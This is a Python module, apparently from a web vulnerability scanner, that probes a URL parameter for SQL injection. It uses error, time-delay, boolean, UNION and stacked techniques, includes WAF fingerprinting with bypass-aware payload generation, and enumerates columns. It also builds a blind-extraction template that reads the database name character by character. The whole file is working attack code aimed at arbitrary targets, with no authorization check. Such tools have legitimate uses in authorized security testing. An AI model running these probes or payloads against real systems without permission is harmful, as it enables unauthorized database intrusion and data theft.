import re
import statistics
import time
from typing import List, Optional, Tuple

import requests

from tools.http_client import build_url
from tools.log_utils import get_logger
from tools.payload_engine import (
    generate_sqli_boolean,
    generate_sqli_error,
    generate_sqli_stacked,
    generate_sqli_time,
    generate_sqli_union,
)
from tools.response_profiler import CLEAN_VALUE, ResponseProfiler
from tools.settings import settings

try:
    from tools.waf_bypass import fingerprint_waf
    HAS_WAF = True
except Exception:
    HAS_WAF = False

logger = get_logger("sql_injection")

SQLI_ERROR_PATTERNS = [
    (r"SQL syntax.*MySQL", "MySQL"),
    (r"you have an error in your sql syntax", "MySQL"),
    (r"near '.*' at line", "MySQL"),
    (r"mysql_", "MySQL"),
    (r"Warning.*mysql_.*", "MySQL"),
    (r"MySQLSyntaxErrorException", "MySQL"),
    (r"valid MySQL result", "MySQL"),
    (r"check the manual that corresponds to your (MySQL|MariaDB) server", "MySQL"),
    (r"Unknown column '[^']+' in 'field list'", "MySQL"),
    (r"Microsoft OLE DB.*SQL Server", "MSSQL"),
    (r"Unclosed quotation mark after the character string", "MSSQL"),
    (r"mssql_query\(\)", "MSSQL"),
    (r"SQL Server.*Driver.*SQL", "MSSQL"),
    (r"Driver.*SQL Server", "MSSQL"),
    (r"SQL Server.*[0-9a-fA-F]{8}", "MSSQL"),
    (r"PSQLException", "PostgreSQL"),
    (r"PostgreSQL.*ERROR", "PostgreSQL"),
    (r"Warning.*\Wpgsql\W", "PostgreSQL"),
    (r"valid PostgreSQL result", "PostgreSQL"),
    (r"PG::SyntaxError", "PostgreSQL"),
    (r"SQLite/JDBCDriver", "SQLite"),
    (r"SQLite.Exception", "SQLite"),
    (r"System.Data.SQLite", "SQLite"),
    (r"SQLite3::SQLException", "SQLite"),
    (r"SqlException", "MSSQL"),
    (r"System\.Data\.SqlClient", "MSSQL"),
    (r"Msg \d+, Level \d+", "MSSQL"),
    (r"Conversion failed when converting", "MSSQL"),
    (r"Incorrect syntax near", "MSSQL"),
    (r"Invalid column name", "MSSQL"),
    (r"Must declare the scalar variable", "MSSQL"),
    (r"String or binary data would be truncated", "MSSQL"),
    (r"Microsoft ODBC SQL Server Driver", "MSSQL"),
    (r"Unclosed quotation mark before the character string", "MSSQL"),
    (r"ERROR:\s*line \d+", "PostgreSQL"),
    (r"Query failed: ERROR", "PostgreSQL"),
    (r"psycopg", "PostgreSQL"),
    (r"pg_query\(\)", "PostgreSQL"),
    (r"ORA-[0-9]{5}", "Oracle"),
    (r"Oracle.*Driver", "Oracle"),
    (r"java\.sql\.SQLException", None),
    (r"SQLiteJDBC", "SQLite"),
    (r"android\.database\.sqlite", "SQLite"),
    (r"sqlite3\.OperationalError", "SQLite"),
    (r"near \"?: syntax error", "SQLite"),
    (r"Unclosed quotation mark", "MySQL"),
    (r"unclosed quotation mark", "MySQL"),
    (r"Unterminated string literal", "MySQL"),
    (r"quoted string not properly terminated", "MySQL"),
    (r"Syntax error or access violation", "MySQL"),
    (r"mysql_fetch", "MySQL"),
    (r"mysqli_fetch", "MySQL"),
    (r"supplied argument is not a valid MySQL", "MySQL"),
    (r"Division by zero.*SQL", None),
    (r"Data truncated", None),
    (r"Column count doesn't match", None),
    (r"Table '[^']+' doesn't exist", None),
]

PROFILER = ResponseProfiler()


def _measure_baseline_timing(url: str, param: str, sess: requests.Session,
                              timeout: float, post_data: dict = None) -> float:
    samples = []
    for _ in range(3):
        try:
            start = time.time()
            if post_data:
                d = post_data.copy()
                d[param] = CLEAN_VALUE
                sess.post(url, data=d, timeout=timeout)
            else:
                sess.get(build_url(url, param, CLEAN_VALUE), timeout=timeout)
            samples.append(time.time() - start)
        except Exception:
            pass
    if not samples:
        return 0.3
    return statistics.median(samples) if len(samples) >= 3 else sum(samples) / len(samples)


def _resolve_waf_name(url: str, sess: requests.Session, timeout: float) -> Optional[str]:
    if HAS_WAF:
        try:
            waf_info = fingerprint_waf(url, sess, timeout)
            return waf_info.get("name")
        except Exception:
            pass
    return None


def _extract_dbms(text: str) -> Optional[str]:
    for pat, dbms in SQLI_ERROR_PATTERNS:
        if dbms and re.search(pat, text, re.IGNORECASE):
            return dbms
    return None


def _gen_payloads_for_param(param: str, waf_name: Optional[str] = None) -> Tuple[str, List[str]]:
    ctx = "numeric" if param.lower() in ("id", "uid", "pid", "page", "limit", "offset") else "string"
    return ctx, generate_sqli_error(ctx, waf_name)


def _detect_error_sqli(url, param, sess, timeout, post_data, base_data, waf_name=None):
    result = {"vulnerable": False, "type": None, "evidence": [], "vector": None, "dbms": None}
    ctx = "numeric" if param.lower() in ("id", "uid", "pid", "page", "limit", "offset") else "string"

    def _probe(payloads):
        confirmed = 0
        for payload in payloads:
            try:
                if post_data is not None:
                    d = base_data.copy() if base_data else {}
                    d[param] = payload
                    r = sess.post(url, data=d, timeout=timeout)
                else:
                    r = sess.get(build_url(url, param, payload), timeout=timeout)
            except Exception as e:
                logger.debug("sqli error payload %s: %s", payload[:20], e)
                continue
            for pat, dbms in SQLI_ERROR_PATTERNS:
                if re.search(pat, r.text, re.IGNORECASE):
                    confirmed += 1
                    result["vulnerable"] = True
                    result["type"] = "error"
                    result["evidence"].append(payload[:40])
                    result["vector"] = payload
                    result["dbms"] = dbms or _extract_dbms(r.text)
                    if confirmed >= 2:
                        return confirmed
                    break
        return confirmed

    confirmed_count = _probe(generate_sqli_error(ctx, waf_name))

    # DBMS-aware retry: probe each backend family with database-specific
    # payloads (CONVERT/CAST/UTL_INADDR/...) that generic seeds miss. Also
    # hardens the fingerprint once an error leaks the backend.
    if confirmed_count < 2:
        from tools.payload_engine import generate_for_dbms
        families = ["MySQL", "MSSQL", "PostgreSQL", "Oracle", "SQLite"]
        if result.get("dbms"):
            families = [result["dbms"]] + [f for f in families if f != result["dbms"]]
        for family in families:
            if confirmed_count >= 2:
                break
            dbms_payloads = [p["payload"] for p in generate_for_dbms(
                "sqli", "error", family, "all", waf_name, max_payloads=6)]
            hits = _probe(dbms_payloads)
            if hits:
                confirmed_count += hits
                if result.get("dbms") is None:
                    result["dbms"] = family

    if confirmed_count < 2 and result.get("dbms") is None:
        # Zero pattern hits -> not error-injectable. A single hit that leaks
        # the DBMS (Msg NNN / ORA- / ERROR: line) is itself strong evidence.
        result["vulnerable"] = False
        result["evidence"] = []
        result["vector"] = None
    return result





def _send(url, param, payload, sess, timeout, post_data, base_data):
    """Send one request with the given payload value. Returns response or None."""
    try:
        if post_data is not None:
            d = base_data.copy() if base_data else {}
            d[param] = payload
            return sess.post(url, data=d, timeout=timeout)
        return sess.get(build_url(url, param, payload), timeout=timeout)
    except Exception:
        return None


def _same_response(r1, r2) -> bool:
    """Loose equality: same status and near-identical body length."""
    if r1 is None or r2 is None:
        return False
    if r1.status_code != r2.status_code:
        return False
    l1, l2 = len(r1.text), len(r2.text)
    if l1 == l2:
        return True
    return abs(l1 - l2) <= max(2, int(min(l1, l2) * 0.02))


def _looks_like_error(r) -> bool:
    if r is None:
        return False
    if r.status_code in (500, 502, 503, 404):
        return True
    text = r.text[:4000].lower()
    for pat in (r"sql syntax", r"mysql", r"unclosed quotation", r"unterminated",
                r"warning", r"fatal error", r"exception", r"pg_", r"ora-",
                r"sqlite", r"microsoft ole db", r"driver", r"syntax error"):
        try:
            if re.search(pat, text):
                return True
        except Exception:
            continue
    return False


def _probe_context(url, param, sess, timeout, post_data, base_data) -> str:
    """Black-box probe: is the injection point numeric or string?

    numeric: '7-0' evaluates to 7 -> response matches '7'; a trailing quote
             breaks the query.
    string:  a single quote inside the string literal changes the value but
             keeps the query valid; '7-0' is a different literal -> differs.
    Returns 'numeric', 'string' or 'unknown' (falls back to caller heuristics).
    """
    try:
        r7 = _send(url, param, "7", sess, timeout, post_data, base_data)
        r70 = _send(url, param, "7-0", sess, timeout, post_data, base_data)
        rq = _send(url, param, "7'", sess, timeout, post_data, base_data)
        if r7 is not None and r70 is not None and _same_response(r7, r70):
            # arithmetic was evaluated -> numeric (unquoted) context
            return "numeric"
        r_alone = _send(url, param, "'", sess, timeout, post_data, base_data)
        r_esc = _send(url, param, "\\'", sess, timeout, post_data, base_data)
        if (r_alone is not None and r_esc is not None
                and _looks_like_error(r_alone) and not _looks_like_error(r_esc)):
            return "string"
        # fallback: quote breaks the query but an escaped quote does not
        if (rq is not None and r7 is not None
                and _looks_like_error(rq) and not _looks_like_error(r7)):
            return "string"
    except Exception:
        pass
    return "unknown"


def _count_union_columns(url, param, sess, timeout, post_data, base_data,
                         prefix: str) -> int:
    """Enumerate the SELECT column count via ORDER BY N (returns N on success).

    prefix: '1' for numeric context, "'" for string context (already opened).
    """
    baseline = _send(url, param, "%s" % prefix, sess, timeout, post_data, base_data)
    if baseline is None:
        return 0

    from concurrent.futures import ThreadPoolExecutor

    def _probe(n):
        payload = "%s ORDER BY %d-- " % (prefix, n)
        r = _send(url, param, payload, sess, timeout, post_data, base_data)
        if r is None:
            return n, "err"
        if _looks_like_error(r) or _looks_like_column_error(r) or \
                r.status_code != baseline.status_code:
            return n, "err"
        return n, "ok"

    with ThreadPoolExecutor(max_workers=6) as ex:
        results = dict(ex.map(_probe, range(1, 13)))
    last_ok = 0
    for n in range(1, 13):
        if results.get(n) == "ok":
            last_ok = n
        else:
            break
    return last_ok


def _count_union_columns_null(url, param, sess, timeout, post_data, base_data,
                                    prefix: str) -> int:
    """Column count via UNION SELECT NULL,N... : the largest width whose
    response stays clean. Complement to ORDER BY when errors are suppressed."""
    baseline = _send(url, param, "%s" % prefix, sess, timeout, post_data, base_data)
    if baseline is None:
        return 0
    from concurrent.futures import ThreadPoolExecutor

    def _probe(n):
        payload = "%s UNION SELECT %s-- " % (prefix, ",".join(["NULL"] * n))
        r = _send(url, param, payload, sess, timeout, post_data, base_data)
        if r is None:
            return n, "err"
        if _looks_like_error(r) or _looks_like_column_error(r) or \
                r.status_code != baseline.status_code:
            return n, "err"
        return n, "ok"

    with ThreadPoolExecutor(max_workers=6) as ex:
        results = dict(ex.map(_probe, range(1, 13)))
    last_ok = 0
    for n in range(1, 13):
        if results.get(n) == "ok":
            last_ok = n
        else:
            break
    return last_ok


def _looks_like_column_error(r) -> bool:
    if r is None:
        return False
    text = (r.text or "").lower()
    return ("different number of columns" in text or "column count" in text
            or "unknown column" in text or "doesn't match" in text)


def _detect_union_sqli(url, param, sess, timeout, post_data, base_data,
                       waf_name=None, context: str = "unknown"):
    """UNION detection with two outcomes:

    - 'union'       : column count enumerated AND markers reflected in output
                      (usable for direct data extraction).
    - 'union_blind' : column count enumerated but nothing reflected -> the
                      UNION clause executes but the result is not rendered;
                      still exploitable via boolean/time blind extraction.
    """
    result = {"vulnerable": False, "type": None, "evidence": [],
              "vector": None, "dbms": None, "column_count": None,
              "reflection_points": []}
    if context == "string":
        prefixes = ["'", "')", "'\\\""]
    elif context == "numeric":
        prefixes = ["1", ""]
    else:
        prefixes = ["'", "1"]

    best_cols = 0
    best_prefix = None
    for prefix in prefixes:
        cols = _count_union_columns(url, param, sess, timeout, post_data,
                                    base_data, prefix)
        if cols >= 12:
            # ORDER BY never errored (cap hit): some apps/WAFs swallow ORDER BY
            # errors. Fall back to UNION SELECT NULL,N... boundary probing.
            cols = _count_union_columns_null(url, param, sess, timeout,
                                             post_data, base_data, prefix)
        if cols < 1:
            continue
        markers = ["UMK_%d_%d" % (i, hash((prefix, i)) % 1000) for i in range(1, cols + 1)]
        quoted = ",".join("'%s'" % m for m in markers)
        payload = "%s UNION SELECT %s-- " % (prefix, quoted)
        r = _send(url, param, payload, sess, timeout, post_data, base_data)
        if r is None:
            continue
        reflected = []
        for i, m in enumerate(markers):
            if m in r.text:
                reflected.append(i + 1)
        if reflected:
            result["vulnerable"] = True
            result["type"] = "union"
            result["column_count"] = cols
            result["reflection_points"] = reflected
            result["vector"] = "%s UNION SELECT %s-- " % (prefix, ",".join(
                ["'MARK_%d'" % (i + 1) for i in range(cols)]))
            result["evidence"].append(
                "union: %d columns, reflected in %s" % (cols, reflected))
            result["dbms"] = _extract_dbms(r.text)
            break
        if cols > best_cols:
            best_cols, best_prefix = cols, prefix

    if not result["vulnerable"] and 1 <= best_cols <= 10:
        # Column count proven (ORDER BY N+1 fails) but no reflection: the
        # UNION clause is valid, output is suppressed -> blind extraction.
        nulls = ",".join(["NULL"] * (best_cols - 1))
        if nulls:
            template = "%s UNION SELECT IF((SUBSTRING((SELECT DATABASE()),1,1)>'a'),1,2),%s-- " % (
                best_prefix, nulls)
        else:
            template = "%s UNION SELECT IF((SUBSTRING((SELECT DATABASE()),1,1)>'a'),1,2)-- " % best_prefix
        result["vulnerable"] = True
        result["type"] = "union_blind"
        result["column_count"] = best_cols
        result["vector"] = template
        result["evidence"].append(
            "union_blind: %d columns proven, no reflection -> boolean/time "
            "extraction template emitted" % best_cols)
    return result


def _measure_baseline_lengths(url, param, sess, timeout, post_data, base_data, samples=3):
    """Median body length over N baseline requests (robust to jitter)."""
    lengths = []
    for _ in range(samples):
        r = _send(url, param, "1", sess, timeout, post_data, base_data)
        if r is not None:
            lengths.append(len(r.text))
    if not lengths:
        return None
    lengths.sort()
    return lengths[len(lengths) // 2]


def _detect_boolean_sqli(url, param, sess, timeout, post_data, base_data,
                         waf_name=None, context: str = "unknown"):
    result = {"vulnerable": False, "type": None, "evidence": [], "vector": None,
              "confidence_score": 0.0, "confidence_votes": []}
    ctx = context
    if ctx not in ("numeric", "string"):
        ctx = "numeric" if param.lower() in ("id", "uid", "pid", "page", "limit", "offset") else "string"

    baseline_len = _measure_baseline_lengths(url, param, sess, timeout,
                                             post_data, base_data)
    if baseline_len is None:
        return result

    bool_pairs = generate_sqli_boolean(ctx, waf_name)
    if not bool_pairs:
        return result
    total_pairs = min(len(bool_pairs), 6)
    pair_confirmed = 0
    diffs = []

    for true_p, false_p in bool_pairs[:total_pairs]:
        try:
            r_true = _send(url, param, true_p, sess, timeout, post_data, base_data)
            r_false = _send(url, param, false_p, sess, timeout, post_data, base_data)
            if r_true is None or r_false is None:
                continue
            l_t, l_f = len(r_true.text), len(r_false.text)
            diff = abs(l_t - l_f)
            max_len = max(l_t, l_f, 1)
            ratio = diff / max_len
            status_diff = r_true.status_code != r_false.status_code
            # Threshold: relative ratio first, absolute floor as secondary guard.
            hit = (ratio > 0.04 and diff > 40) or status_diff
            if hit:
                diffs.append((diff, ratio, true_p, false_p, status_diff))
                pair_confirmed += 1
                result["evidence"].append(
                    "bool: %s vs %s (diff=%d ratio=%.1f%%)" % (
                        true_p[:22], false_p[:22], diff, ratio * 100))
                result["vector"] = true_p
        except Exception as e:
            logger.debug("sqli boolean %s: %s", true_p[:20], e)

    if pair_confirmed >= 2:
        result["vulnerable"] = True
        result["type"] = "boolean"
    elif pair_confirmed == 1 and diffs:
        # Single hit: re-verify once to reject transient jitter.
        d, ratio, tp, fp, sdiff = max(diffs)
        try:
            r_true = _send(url, param, tp, sess, timeout, post_data, base_data)
            r_false = _send(url, param, fp, sess, timeout, post_data, base_data)
            if r_true is not None and r_false is not None:
                diff2 = abs(len(r_true.text) - len(r_false.text))
                if diff2 > max(30, int(baseline_len * 0.03)) or \
                        r_true.status_code != r_false.status_code:
                    result["vulnerable"] = True
                    result["type"] = "boolean"
                    result["evidence"].append(
                        "bool re-verified: diff=%d" % diff2)
        except Exception:
            pass

    if result["vulnerable"] and total_pairs > 0:
        vote = pair_confirmed / total_pairs
        result["confidence_score"] = round(min(0.95, vote * 0.9), 2)
        if vote >= 0.6:
            result["confidence"] = "high"
        elif vote >= 0.3:
            result["confidence"] = "medium"
        else:
            result["confidence"] = "low"

    return result


def _detect_stacked_sqli(url, param, sess, timeout, post_data, base_data, waf_name=None):
    result = {"vulnerable": False, "type": None, "evidence": [], "vector": None}
    ctx = "numeric" if param.lower() in ("id", "uid", "pid", "page", "limit", "offset") else "string"
    stacked_payloads = generate_sqli_stacked(ctx, waf_name)
    for payload in stacked_payloads:
        try:
            if post_data is not None:
                d = base_data.copy() if base_data else {}
                d[param] = payload
                r = sess.post(url, data=d, timeout=timeout)
            else:
                r = sess.get(build_url(url, param, payload), timeout=timeout)
            for pat, dbms in SQLI_ERROR_PATTERNS:
                if re.search(pat, r.text, re.IGNORECASE):
                    result["vulnerable"] = True
                    result["type"] = "stacked_error"
                    result["evidence"].append("stacked: %s" % payload[:25])
                    result["vector"] = payload
                    return result
        except Exception as e:
            logger.debug("sqli stacked %s: %s", payload[:20], e)
    return result


_DELAY_KEYWORDS = ("SLEEP", "pg_sleep", "WAITFOR", "BENCHMARK",
                        "DBMS_PIPE", "DBMS_LOCK", "randomblob", "sleep")


def _negative_control(payload: str) -> str:
    """Map a delay payload to its zero-delay twin (same syntax, no sleep)."""
    p = payload
    p = re.sub(r"SLEEP\(\d+\)", "SLEEP(0)", p, flags=re.IGNORECASE)
    p = re.sub(r"pg_sleep\(\d+\)", "pg_sleep(0)", p, flags=re.IGNORECASE)
    p = re.sub(r"WAITFOR DELAY '0:0:\d+'", "WAITFOR DELAY '0:0:0'", p, flags=re.IGNORECASE)
    p = re.sub(r"BENCHMARK\(\d+", "BENCHMARK(1000", p, flags=re.IGNORECASE)
    p = re.sub(r"RECEIVE_MESSAGE\('[^']*',\d+\)", "RECEIVE_MESSAGE('a',0)", p, flags=re.IGNORECASE)
    p = re.sub(r"DBMS_LOCK\.SLEEP\(\d+\)", "DBMS_LOCK.SLEEP(0)", p, flags=re.IGNORECASE)
    p = re.sub(r"randomblob\(\d+\)", "randomblob(1)", p, flags=re.IGNORECASE)
    p = re.sub(r"sleep\(\d+\)", "sleep(0)", p, flags=re.IGNORECASE)
    return p


def _measure_elapsed(url, param, payload, sess, timeout, post_data, base_data):
    try:
        start_t = time.time()
        if post_data is not None:
            d = base_data.copy() if base_data else {}
            d[param] = payload
            sess.post(url, data=d, timeout=timeout + 3)
        else:
            sess.get(build_url(url, param, payload), timeout=timeout + 3)
        return time.time() - start_t
    except requests.Timeout:
        return timeout + 3.0
    except Exception:
        return None


def _detect_time_sqli(url, param, sess, timeout, post_data, base_data, waf_name=None,
                         dbms_hint=None):
    result = {"vulnerable": False, "type": None, "evidence": [], "vector": None, "dbms": None,
              "confidence_score": 0.0, "confidence_votes": []}
    baseline_sec = _measure_baseline_timing(url, param, sess, timeout, post_data)
    if baseline_sec >= timeout * 0.8:
        return result
    threshold = max(2.0, baseline_sec * 1.5 + 1.5)
    logger.debug("time baseline=%.2fs threshold=%.2fs", baseline_sec, threshold)

    if dbms_hint:
        from tools.payload_engine import generate_sqli_time_for
        time_payloads = generate_sqli_time_for(dbms_hint, waf_name)
    else:
        time_payloads = generate_sqli_time(waf_name)
    confirmed_count = 0
    total_attempts = 0
    for payload in time_payloads:
        total_attempts += 1
        elapsed = _measure_elapsed(url, param, payload, sess, timeout,
                                   post_data, base_data)
        if elapsed is None:
            continue
        timed_out = elapsed >= timeout + 1.0
        if not (elapsed >= threshold or timed_out):
            continue
        if timed_out:
            # Ambiguous (request timed out): could be server sleep or network
            # latency. Negative control: same syntax, zero delay. If the
            # control also stalls, reject as network/server noise.
            control = _negative_control(payload)
            c_elapsed = _measure_elapsed(url, param, control, sess, timeout,
                                         post_data, base_data)
            if c_elapsed is not None and c_elapsed < threshold:
                confirmed_count += 1
                result["vulnerable"] = True
                result["type"] = "time"
                result["evidence"].append(
                    "time: %.1fs (control=%.1fs, baseline=%.1fs)" % (
                        elapsed, c_elapsed, baseline_sec))
                result["vector"] = payload
            else:
                logger.debug("sqli time rejected by control: %s", payload[:30])
        else:
            # Clean measurable delay above threshold -> strong signal.
            confirmed_count += 1
            result["vulnerable"] = True
            result["type"] = "time"
            result["evidence"].append(
                "time: %.1fs (baseline=%.1fs)" % (elapsed, baseline_sec))
            result["vector"] = payload
        if confirmed_count >= 2:
            break
        if result["vulnerable"]:
            if "SLEEP" in payload:
                result["dbms"] = "MySQL"
            elif "pg_sleep" in payload:
                result["dbms"] = "PostgreSQL"
            elif "WAITFOR" in payload:
                result["dbms"] = "MSSQL"
            elif "DBMS_PIPE" in payload or "DBMS_LOCK" in payload:
                result["dbms"] = "Oracle"
            elif "randomblob" in payload:
                result["dbms"] = "SQLite"

    if result["vulnerable"] and total_attempts > 0:
        vote = confirmed_count / total_attempts
        result["confidence_score"] = round(min(0.95, vote), 2)
        if confirmed_count >= 2:
            result["confidence"] = "high"
        elif confirmed_count >= 1:
            result["confidence"] = "medium"
        else:
            result["confidence"] = "low"

    return result


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0, post_body: bool = False, post_data: dict = None,
          waf_name: Optional[str] = None,
          auto_detect_waf: bool = True) -> dict:
    if sess is None:
        sess = requests.Session()
        sess.verify = settings.verify_ssl

    if waf_name is None and auto_detect_waf:
        waf_name = _resolve_waf_name(url, sess, timeout)
        if waf_name:
            logger.info("detected WAF: %s", waf_name)

    result = {"vulnerable": False, "type": None, "evidence": [], "vector": None,
              "dbms": None, "waf_detected": waf_name, "confidence": "low",
              "confidence_score": 0.0, "confidence_votes": []}

    base_data = post_data.copy() if post_body and post_data else None

    # Black-box context probe: numeric vs string injection point. Falls back
    # to a param-name heuristic when the probe is inconclusive.
    ctx = _probe_context(url, param, sess, timeout,
                         post_data if post_body else None, base_data)
    if ctx == "unknown":
        ctx = "numeric" if param.lower() in ("id", "uid", "pid", "page", "limit", "offset") else "string"
    result["context"] = ctx

    def _run(det_name, det_func):
        kw = {}
        if det_name in ("boolean", "union"):
            kw["context"] = ctx
        if det_name == "time" and result.get("dbms"):
            kw["dbms_hint"] = result["dbms"]
        try:
            return det_func(url, param, sess, timeout,
                            post_data if post_body else None, base_data,
                            waf_name, **kw)
        except TypeError:
            return det_func(url, param, sess, timeout,
                            post_data if post_body else None, base_data, waf_name)

    detectors = [
        ("error", _detect_error_sqli),
        ("time", _detect_time_sqli),
        ("boolean", _detect_boolean_sqli),
        ("union", _detect_union_sqli),
        ("stacked", _detect_stacked_sqli),
    ]

    for det_name, det_func in detectors:
        r = _run(det_name, det_func)
        if r["vulnerable"]:
            result.update(r)
            if "confidence_score" in r and r["confidence_score"]:
                if r["confidence_score"] > result.get("confidence_score", 0):
                    result["confidence_score"] = r["confidence_score"]
                    result["confidence"] = r.get("confidence", "medium")
            break

    if not result["vulnerable"]:
        result["confidence_score"] = 0.0
        result["confidence_votes"] = []
    return result

    return result
